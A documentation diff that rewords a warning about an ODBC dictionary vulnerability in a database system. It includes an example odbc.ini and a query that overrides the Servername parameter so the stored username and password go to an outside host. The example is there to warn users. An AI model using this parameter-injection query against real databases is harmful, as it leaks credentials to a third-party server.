@@ -125,14 +125,14 @@ Setting fields:
 - `invalidate_query` – Query for checking the dictionary status. Optional parameter. Read more in the section [Updating dictionaries](external_dicts_dict_lifetime.md#dicts-external_dicts_dict_lifetime).
 
 
-### The vulnerability of the ODBC driver
+### Known vulnerability of the ODBC dictionary functionality
 
-!!!attention
-    If when connecting to the database through the ODBC driver you substitute connection parameter `Servername` then values of `USERNAME` and `PASSWORD` from `odbc.ini` are sent to the remote server and can be compromised.
+!!! attention
+    When connecting to the database through the ODBC driver connection parameter `Servername` can be substituted. In this case values of `USERNAME` and `PASSWORD` from `odbc.ini` are sent to the remote server and can be compromised.
 
 **Example of insecure use**
 
-Let's configure unixODBC for PostgreSQL. Content of `/etc/odbc.ini` is:
+Let's configure unixODBC for PostgreSQL. Content of `/etc/odbc.ini`:
 
 ```
 [gregtest]
@@ -145,13 +145,13 @@ USERNAME = test
 PASSWORD = test
 ```
 
-If then you make a query such as
+If you then make a query such as
 
 ```
 SELECT * FROM odbc('DSN=gregtest;Servername=some-server.com', 'test_db');    
 ```
 
-then ODBC driver sends values of `USERNAME` and `PASSWORD` for `Servername = localhost` to `some-server.com`.
+ODBC driver will send values of `USERNAME` and `PASSWORD` from `odbc.ini` to `some-server.com`.
 
 ### Example of Connecting PostgreSQL
 
